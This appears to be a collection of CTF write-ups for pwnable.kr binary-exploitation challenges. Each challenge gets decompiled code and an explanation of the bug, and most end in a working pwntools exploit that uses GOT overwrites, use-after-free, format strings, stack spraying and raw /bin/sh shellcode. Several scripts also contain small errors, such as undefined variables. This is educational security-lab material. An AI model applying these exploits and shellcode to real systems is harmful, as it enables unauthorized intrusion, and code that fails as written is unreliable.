# alloca

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void callme(){
	system("/bin/sh");
}

void clear_newlines(){
	int c;
	do{
		c = getchar();
	}while (c != '\n' && c != EOF);
}

int g_canary;
int check_canary(int canary){
	int result = canary ^ g_canary;
	int canary_after = canary;
	int canary_before = g_canary;
	printf("canary before using buffer : %d\n", canary_before);
	printf("canary after using buffer : %d\n\n", canary_after);
	if(result != 0){
		printf("what the ....??? how did you messed this buffer????\n");
	}
	else{
		printf("I told you so. its trivially easy to prevent BOF :)\n");
		printf("therefore as you can see, it is easy to make secure software\n");
	}
	return result;
}

int size;
char* buffer;
int main(){

	printf("- BOF(buffer overflow) is very easy to prevent. here is how to.\n\n");
	sleep(1);
	printf("   1. allocate the buffer size only as you need it\n");
	printf("   2. know your buffer size and limit the input length\n\n");

	printf("- simple right?. let me show you.\n\n");
	sleep(1);

	printf("- whats the maximum length of your buffer?(byte) : ");
	scanf("%d", &size);
	clear_newlines();

        printf("- give me your random canary number to prove there is no BOF : ");
        scanf("%d", &g_canary);
        clear_newlines();

	printf("- ok lets allocate a buffer of length %d\n\n", size);
	sleep(1);

	buffer = alloca( size + 4 );	// 4 is for canary

	printf("- now, lets put canary at the end of the buffer and get your data\n");
	printf("- don't worry! fgets() securely limits your input after %d bytes :)\n", size);
	printf("- if canary is not changed, we can prove there is no BOF :)\n");
	printf("$ ");

	memcpy(buffer+size, &g_canary, 4);	// canary will detect overflow.
	fgets(buffer, size, stdin);		// there is no way you can exploit this.

	printf("\n");
	printf("- now lets check canary to see if there was overflow\n\n");

	check_canary( *((int*)(buffer+size)) );
	return 0;
}
```

Although it has Stack Canary, we can give a negative number in size to bypass the protection. However, we cannot give a number which allows us to overwrite *ret* address. The only useful pointer we can overwrite is *$ebp*. So, we need stack spray to overwrite environment variable, and make $ebp points to the possible location.

```python
from pwn import *

ret = "-4759552" 
spray = p32(0x80485ab)*35000
env = {str(a):spray for a in range(12)}
p = process('alloca', env=env)
p.sendline('-68')
p.sendline(ret)
p.interactive()
```

# Brain Fuck (pt150

After decompiling it, we can find that the program gets 1024 characters from our input and interprets in the function `do_brainfuck`. Decompile the function, we get:
```c
int __cdecl do_brainfuck(char a1)
{
  int result; // eax
  _BYTE *v2; // ebx

  result = a1;
  switch ( a1 )
  {
    case 43:
      result = p;
      ++*(_BYTE *)p;
      break;
    case 44:
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case 45:
      result = p;
      --*(_BYTE *)p;
      break;
    case 46:
      result = putchar(*(char *)p);
      break;
    case 60:
      result = p-- - 1;
      break;
    case 62:
      result = p++ + 1;
      break;
    case 91:
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

We have seven operations:
- `+` add 1 from the byte pointed by p
- `,` get input from user
- `-` del 1 from the byte pointed by p
- `.` put content in pointer *p* to standard output
- `<` delete 1 to pointer *p*
- `>` add 1 to pointer *p*
- `[` not supported...

After lazy binding, the value of *.got.plt* will directly point to the function in libc. We can add or subtract a offset to *.got.plt* to change the value to the address of `system`. Because there is no direct way for us to pass a string to a function. We need to overwrite `putchar` to `main`. Then, `memset` to `fgets`, and finally `fgets` to `system`.

We can get them through gdb:
```
pwndbg> disass getcahr
Dump of assembler code for function getchar@plt:
   0x08048440 <+0>:     jmp    DWORD PTR ds:0x804a00c
   0x08048446 <+6>:     push   0x0
   0x0804844b <+11>:    jmp    0x8048430
```
> To avoid repeating, I only show one instance

```python
from pwn import *

bin = remote('pwnable.kr', 9001)

system_offset = 0x3a920
putchar_offset = 0x60c80
memset_offset = 0x76150
fgets_offset = 0x5d540
gets_offset = 0x5e770

payload = "<" * 112 # go to putchar got
payload += ".>" * 4 # leak address
payload += "<" * 4 # prepare to write
payload += ",>" * 4 # write putchar got
payload += "<" * 8 # go to memset got
payload += ",>" * 4 # write memset got
payload += "<" * 32 # go to fgets got
payload += ",>" * 4 # write fgets got
payload += "." # tirger

bin.recvuntil(']')
bin.sendline(payload)
putchar_addr = u32(bin.recv(4))
libc_base = putchar_addr - putchar_offset
system_addr = libc_base + system_offset
memset_addr = libc_base + memset_offset
fgets_addr = libc_base + fgets_offset
gets_addr = libc_base + gets_offset

bin.send(p32(main_addr))
bin.send(p32(gets_addr))
bin.send(p32(system_addr))

bin.sendline("/bin/sh\x00")
bin.interactive()
```

# crypto 1

A simple Padding Oracle Attack

Check this [article](https://github.com/mpgn/Padding-oracle-attack)

# dragon (pt 75)

We use integer overflow to defeat the dragon. And then use redirection to bypass check in `SecrectFunction`.

The overview of Priest attack:
```c
int __cdecl PriestAttack(int a1, void *ptr)
{
  int v2; // eax

  do
  {
    (*(void (__cdecl **)(void *))ptr)(ptr);
    (*(void (__cdecl **)(int))(a1 + 12))(a1);
    v2 = GetChoice();
    switch ( v2 )
    {
      case 2:
        puts("Clarity! Your Mana Has Been Refreshed");
        *(_DWORD *)(a1 + 8) = 50;
        printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));
        *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);
        printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));
        *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
        break;
      case 3:
        if ( *(_DWORD *)(a1 + 8) <= 24 )
        {
          puts("Not Enough MP!");
        }
        else
        {
          puts("HolyShield! You Are Temporarily Invincible...");
          printf("But The Dragon Heals %d HP!\n", *((char *)ptr + 9));
          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
          *(_DWORD *)(a1 + 8) -= 25;
        }
        break;
      case 1:
        if ( *(_DWORD *)(a1 + 8) <= 9 )
        {
          puts("Not Enough MP!");
        }
        else
        {
          printf("Holy Bolt Deals %d Damage To The Dragon!\n", 20);
          *((_BYTE *)ptr + 8) -= 20;
          *(_DWORD *)(a1 + 8) -= 10;
          printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));
          *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);
          printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));
          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
        }
        break;
    }
    if ( *(_DWORD *)(a1 + 4) <= 0 )
    {
      free(ptr);
      return 0;
    }
  }
  while ( *((_BYTE *)ptr + 8) > 0 );
  free(ptr);
  return 1;
}
```

Here:
```c
printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));
*((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
```

Notice `_BYTE `, which is equal to `short`. It has size 0x100 (`-128`~`+127`. However, when the number inside is exactly `128`. It will overflow and becomes zero. If we can keep the mama dragon healing, we can cause the overflow. The Priest's invincibility allows us to achieve that. 

When we killed the dragon, the program will free a chunk in size 0x10 which stores dragon information chunk. However, we can control the chunk when we input our name (it also applies a chunk with 0x10 size to store). The program subsequently call the function in dragon info chunk. We can overwrite it to arbitrary address:
```python
from pwn import *

p = remote("pwnable.kr", 9004)

def choose(choice):
	p.recvuntil("Hero")
	p.sendline(str(choice))

def attack(choice):
	p.recvuntil("[")
	p.sendline(str(choice))

p.recvuntil("!")
choose(2)
attack(2)

choose(1)
opt = [3, 3, 2, 3, 3, 2, 3, 3, 2, 3, 3, 2]

for i in opt:
	attack(i)

p.recvuntil(":")
payload = p32(0x08048dbf)
p.sendline(payload)
p.interactive()
```

# Echo1 (pt25

This program will ask for our name and put it in the *.bss* section(`0x6020A0`). After retrieving out name, it will show a menu for us to chose. We have three option, but only one is effective(the first one). It let use input some chars which lead to a simple buffer overflow.

While it does not enable N^X, we can execute our shellcode on the stack. But the problem is how to get there. Remember the *.bss* section which allows us to write 4 bytes? We can write a `jmp rsp` there. And then, we ret to the *.bss* section to jump to stack. Finally, we can execute our shellcode:
```python
from pwn import *                                                                                 
                                                                                                  
garbage = 40 * "A"       # write grabage data to fill the stack

payload = grabage
payload += p64(0x6020a0) # ret to .bss section which record our first input                                                                          
payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x
54\x5e\xb0\x3b\x0f\x05"  # payload from shellstorm

bin = remote("pwnable.kr", 9010)      
id = "\x90\x90\xff\xe4"  # asm code of "jmp rsp; nop; nop"
bin.recvuntil(":")                                                                                
bin.sendline(id)                                                                                  
                                                                                                  
bin.recvuntil(">")                                                                                
bin.sendline("1")                                                                                 
                                                                                                  
bin.recvuntil("hello")                                                                            
bin.sendline(payload)                                                                             
bin.interactive()
```

# echo2 (pt 50)

Overview:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int *v3; // rsi
  _QWORD *v4; // rax
  unsigned int v6; // [rsp+Ch] [rbp-24h]
  __int64 v7; // [rsp+10h] [rbp-20h]
  __int64 v8; // [rsp+18h] [rbp-18h]
  __int64 v9; // [rsp+20h] [rbp-10h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  o = malloc(0x28uLL);
  *((_QWORD *)o + 3) = greetings;
  *((_QWORD *)o + 4) = byebye;
  printf("hey, what's your name? : ", 0LL);
  v3 = (unsigned int *)&v7;
  __isoc99_scanf("%24s", &v7);
  v4 = o;
  *(_QWORD *)o = v7;
  v4[1] = v8;
  v4[2] = v9;
  id = v7;
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  v6 = 0;
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ", v3);
        v3 = &v6;
        __isoc99_scanf("%d", &v6);
        getchar();
        if ( v6 > 3 )
          break;
        ((void (__fastcall *)(const char *, unsigned int *))func[v6 - 1])("%d", &v6);
      }
      if ( v6 == 4 )
        break;
      puts("invalid menu");
    }
    cleanup();
    printf("Are you sure you want to exit? (y/n)", &v6);
    v6 = getchar();
  }
  while ( v6 != 121 );
  puts("bye");
  return 0;
}
```

We can input name with 24 length. Then, there are 2 bugs. The first one is in `echo2` (*fsb* option), which has format string vulnerability. 

The second one is a UAF vuln. The program will do `cleanup` before our confirmation. If we type `n`, we can go back to the loop and `o = malloc(0x28uLL);` is freed. In `echo3` function:
```
__int64 echo3()
{
  char *s; // ST08_8

  (*((void (__fastcall **)(void *))o + 3))(o);
  s = (char *)malloc(0x20uLL);
  get_input(s, 32);
  puts(s);
  free(s);
  (*((void (__fastcall **)(void *, signed __int64))o + 4))(o, 32LL);
  return 0LL;
}
```

We can retrieve the chunk which is originally assigned to `o` and edit the function table inside. Here, we change `byebye` to our target location.

N^X is disabled in this program. The format string bug can leak $esp address for us. Our shellcode can be placed in `v6`(input name). After calculating the offset from $esp to `v6`, we get a redirection address:
```python
from pwn import *

p = remote("pwnable.kr", 9011)

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.recvuntil("name?")
p.sendline(shellcode)
p.recvuntil("> ")
p.sendline('2')
p.recvuntil("hello")
p.sendline("%x%x%x%x%x%x%x%x %lx")
p.recvline()
leak = p.recvline()
leak = leak.split(" ")[1]
leak = int(leak, 16) - 0x20
print hex(leak)

p.recvuntil("> ")
p.sendline("4")
p.recvuntil(")")
p.sendline("n")

p.recvuntil("> ")
p.sendline("3")
p.recvuntil("hello")
payload = "AAAAAAAAAAAAAAAAAABCDEFG" + p64(leak)
p.sendline(payload)
p.interactive()
```

While *.bss* is also `rwx`, I think we can also write shellcode inside. And change a function's got to *.bss* area to execute shell.

# fix (pt 35)

## Solution 1

The source code:
```c
#include <stdio.h>

// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void shellcode(){
	// a buffer we are about to exploit!
	char buf[20];

	// prepare shellcode on executable stack!
	strcpy(buf, sc);

	// overwrite return address!
	*(int*)(buf+32) = buf;

	printf("get shell\n");
}

int main(){
        printf("What the hell is wrong with my shellcode??????\n");
        printf("I just copied and pasted it from shell-storm.org :(\n");
        printf("Can you fix it for me?\n");

	unsigned int index=0;
	printf("Tell me the byte index to be fixed : ");
	scanf("%d", &index);
	fflush(stdin);

	if(index > 22)	return 0;

	int fix=0;
	printf("Tell me the value to be patched : ");
	scanf("%d", &fix);

	// patching my shellcode
	sc[index] = fix;

	// this should work..
	shellcode();
	return 0;
}
```

The shellcode does valid. However, when executing it, the shellcode will overwrite itself because of limited stack space:
```
...
ESP  0xfff04cbc —▸ 0xfff04cc4 ◂— '/bin//sh'
EIP  0xfff04cbd ◂— 0xfff04c
[ DISASM ]
   0xfff04caf    push   0x68732f2f
   0xfff04cb4    push   0x6e69622f
   0xfff04cb9    mov    ebx, esp
   0xfff04cbb    push   eax
   0xfff04cbc    les    ecx, ptr [eax + esi*8 - 1]
    ↓
 ► 0xfff04cbd    dec    esp
   0xfff04cbe    lock inc dword ptr [eax]
   0xfff04cc1    add    byte ptr [eax], al
   0xfff04cc3    add    byte ptr [edi], ch
   0xfff04cc5    bound  ebp, qword ptr [ecx + 0x6e]
   0xfff04cc8    das
[ STACK ]
00:0000│ esp eip-1  0xfff04cbc —▸ 0xfff04cc4 ◂— '/bin//sh'
01:0004│            0xfff04cc0 ◂— 0x0
02:0008│ ebx        0xfff04cc4 ◂— '/bin//sh'
03:000c│            0xfff04cc8 ◂— '//sh'
04:0010│            0xfff04ccc ◂— 0x0
05:0014│            0xfff04cd0 ◂— 0x1
06:0018│            0xfff04cd4 —▸ 0xfff04d94 —▸ 0xfff06925 ◂— '/ctf/work/fix'
07:001c│            0xfff04cd8 ◂— 0x31 /* '1' */
```

We can overwrite the `push eax` to `leave`, which equals to `mov esp，ebp;pop ebp`. (change char in index 15 to `\xc9`).

However, the program will alter that it cannot find a file. We just create the file with content `sh`:
```python
from pwn import *

p = process('/home/fix/fix')

p.sendline("15")
p.sendline("201")
p.recvuntil('get shell\n')
error = p.recvline()
p.kill()

a = error_text.find('open ')
fname = error[a+5:-1]
f = open(fname,'w')
f.write('sh\n')
f.close()

p = process(the_path)
p.sendline("15")
p.sendline("201")
p.interactive()
```

## Others...

Some guys use `ultimate` to make stack larger. You can also hook the file in gdb to get shell.

# otp

Overview:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  unsigned __int64 v4; // rax
  __int64 v5; // [rsp+0h] [rbp-D0h]
  __int64 tmp_name; // [rsp+10h] [rbp-C0h]
  __int64 v7; // [rsp+18h] [rbp-B8h]
  __int64 ptr; // [rsp+20h] [rbp-B0h]
  FILE *stream; // [rsp+28h] [rbp-A8h]
  FILE *fd2; // [rsp+30h] [rbp-A0h]
  int fd; // [rsp+3Ch] [rbp-94h]
  char tmp_file_name; // [rsp+40h] [rbp-90h]
  unsigned __int64 v13; // [rsp+C8h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  if ( argc == 2 )
  {
    fd = open("/dev/urandom", 0, envp, argv);
    if ( fd == -1 )
      exit(-1);
    if ( (unsigned int)read(fd, &tmp_name, 0x10uLL) != 16 )
      exit(-1);
    close(fd);
    sprintf(&tmp_file_name, "/tmp/%llu", tmp_name);
    stream = fopen(&tmp_file_name, "w");
    if ( !stream )
      exit(-1);
    fwrite(&v7, 8uLL, 1uLL, stream);
    fclose(stream);
    puts("OTP generated.");
    ptr = 0LL;
    fd2 = fopen(&tmp_file_name, "r");
    if ( !fd2 )
      exit(-1);
    fread(&ptr, 8uLL, 1uLL, fd2);
    fclose(fd2);
    v4 = strtoul(*(const char **)(v5 + 8), 0LL, 16);
    if ( v4 == ptr )
    {
      puts("Congratz!");
      system("/bin/cat flag");
    }
    else
    {
      puts("OTP mismatch");
    }
    unlink(&tmp_file_name);
    result = 0;
  }
  else
  {
    puts("usage : ./otp [passcode]");
    result = 0;
  }
  return result;
}
```

This program randomly creates some files and read the passcode from files. It seems that we cannot crack it.

However, with `ulimit -f 0`, the program can create file but write no bytes to it. So the final password must be *null*.

Script:
```python
import subprocess
subprocess.Popen(['/home/otp/otp', '0'], stderr=subprocess.STDOUT)
```

# simple login (pt 50)

Decompiled code from IDA pro:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+18h] [ebp-28h]
  char s; // [esp+1Eh] [ebp-22h]
  unsigned int v6; // [esp+3Ch] [ebp-4h]

  memset(&s, 0, 0x1Eu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ");
  _isoc99_scanf("%30s", &s);
  memset(&input, 0, 0xCu);
  v4 = 0;
  v6 = Base64Decode(&s, &v4);
  if ( v6 > 0xC )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, v4, v6);
    if ( auth(v6) == 1 )
      correct();
  }
  return 0;
}
```

The program will read a string and decode it in *base64* format. The length of our decrypted string should be less or equal than 12. We can use 12 to overwrite *$esp* in `auth(v6) == 1`. However, because of stack canary and length limitation, we canot overwrite *$eip* in `_isoc99_scanf("%30s", &s);`. 

Our string is stored in *bss* area *input*(0x811EB40). Before we talk about exploit, let's have a look at the vulnerable function:
```assembly
pwndbg> disass auth
Dump of assembler code for function auth:
   0x0804929c <+0>:	push   ebp
   0x0804929d <+1>:	mov    ebp,esp
   0x0804929f <+3>:	sub    esp,0x28
   0x080492a2 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080492a5 <+9>:	mov    DWORD PTR [esp+0x8],eax
   0x080492a9 <+13>:	mov    DWORD PTR [esp+0x4],0x811eb40
   0x080492b1 <+21>:	lea    eax,[ebp-0x14]
   0x080492b4 <+24>:	add    eax,0xc
   0x080492b7 <+27>:	mov    DWORD PTR [esp],eax
   0x080492ba <+30>:	call   0x8069660 <memcpy>
   0x080492bf <+35>:	mov    DWORD PTR [esp+0x4],0xc
   0x080492c7 <+43>:	lea    eax,[ebp-0x14]
   0x080492ca <+46>:	mov    DWORD PTR [esp],eax
   0x080492cd <+49>:	call   0x8049188 <calc_md5>
   0x080492d2 <+54>:	mov    DWORD PTR [ebp-0xc],eax
   0x080492d5 <+57>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080492d8 <+60>:	mov    DWORD PTR [esp+0x4],eax
   0x080492dc <+64>:	mov    DWORD PTR [esp],0x80da677
   0x080492e3 <+71>:	call   0x805b630 <printf>
   0x080492e8 <+76>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080492eb <+79>:	mov    DWORD PTR [esp+0x4],eax
   0x080492ef <+83>:	mov    DWORD PTR [esp],0x80da684
   0x080492f6 <+90>:	call   0x80482f0
   0x080492fb <+95>:	test   eax,eax
   0x080492fd <+97>:	jne    0x8049306 <auth+106>
   0x080492ff <+99>:	mov    eax,0x1
   0x08049304 <+104>:	jmp    0x804930b <auth+111>
   0x08049306 <+106>:	mov    eax,0x0
   0x0804930b <+111>:	leave
   0x0804930c <+112>:	ret
End of assembler dump.
```

In *0x080492ba*(`<+30>:	call   0x8069660 <memcpy>`), the memcpy will trigger stack overflow by copying decrypted input. As above mentioned, we can only overwrite the $esp. However, the following code:
```asm
0x0804930b <+111>:	leave
0x0804930c <+112>:	ret
```

is equal to:
```asm
mov esp，ebp;
pop ebp;
pop eip;
```

What's more, pop uses $esp's current address to get data. We can point $esp to the address of *input*. Then use the first 4 bit of *location* to set *$eip* to *correct* function.

There is an additional check in *correct* function. Just set the 4-8 byte to `0xdeadbeef` to bypass.

Final payload:
`bypass check` + `set eip to correct` + `overflow the esp to input pointer` = `\xef\xbe\xad\xde\x5f\x92\x04\x08\x40\xeb\x11\x08`, which is the same as: `776t3l+SBAhA6xEI`

# Tiny Easy (pt30

We get a application with little disasm code:
```assembly
pop eax
pop edx  
mov edx,DWORD PTR [edx]  
call edx
```

Let's set a break point at `call edx` and investigate what will happen:
```
 EAX  0x1
 EBX  0x0
 ECX  0x0
 EDX  0xffffd372 ◂— 0x6d6f682f ('/hom')
 EDI  0x0
 ESI  0x0
 EBP  0x0
 ESP  0xffffd1b8 ◂— 0x0
 EIP  0x8048058 ◂— mov    call edx
```

The program pops the address of the first 4 bytes of first argument(`/home/tiny_easy/tiny_easy`) to the register. And after checking sec, `N^X` is not enabled. We cannot leak any address through the tiny program, therefore, we need to use stack spray to increase our exploit possibility. By the way, we also need to use special function to execute the ELF, otherwise the system will always set the first argument as `/home/tiny_easy/tiny_easy`.

Final script(I forgot to save mine, this is create by [Eugene Kolo](https://eugenekolo.com/blog/)):
```python
import os  
import subprocess

jumpto = "\xb0\xaf\xb5\xff"  
shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"  
nopsled = "\x90"*4096;  
payload = nopsled+shellcode

myenv = {}  
for i in range(0,100):  
    myenv["spray"+str(i)] = payload

while True:  
    p = subprocess.Popen([jumpto], executable="/home/tiny_easy/tiny_easy", env=myenv)
    p.wait()
```
